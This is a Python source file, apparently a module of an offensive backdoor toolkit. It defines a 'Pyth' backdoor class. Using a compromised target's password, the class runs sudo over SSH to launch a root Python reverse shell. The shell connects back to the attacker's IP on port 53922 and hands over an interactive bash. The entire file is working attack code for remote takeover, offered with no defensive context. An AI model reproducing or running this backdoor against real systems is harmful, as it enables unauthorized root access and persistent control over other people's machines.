from backdoors.backdoor import * 

class Pyth(Backdoor):
	prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
	
	def __init__(self, core):
		cmd.Cmd.__init__(self)
		self.intro = GOOD + "Using Python module..."
		self.core = core
		self.options = {
				"port"   : Option("port", 53922, "port to connect to", True),
				}
		self.modules = {}
		self.allow_modules = True
		self.help_text = INFO + "Uses a short python script to listen for commands and send output back to the user." 

	def get_command(self):
		command = "echo " + self.core.curtarget.pword + " | sudo -S python -c \"import socket, subprocess, os; \
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
			s.connect(('" + self.core.localIP + "', " + str(self.get_value("port")) + ")); \
			os.dup2(s.fileno(),0); \
			os.dup2(s.fileno(),1); \
			os.dup2(s.fileno(),2); \
			subprocess.call(['/bin/bash', '-i'])\" "
		#print(command)
		return command

	def do_exploit(self, args):
		self.listen()
		self.core.curtarget.ssh.exec_command(self.get_command())
		print(GOOD + "Python backdoor on %s attempted." % self.get_value("port"))
		for mod in self.modules.keys():
			print(INFO + "Attempting to execute " + mod.name + " module...")
			mod.exploit() 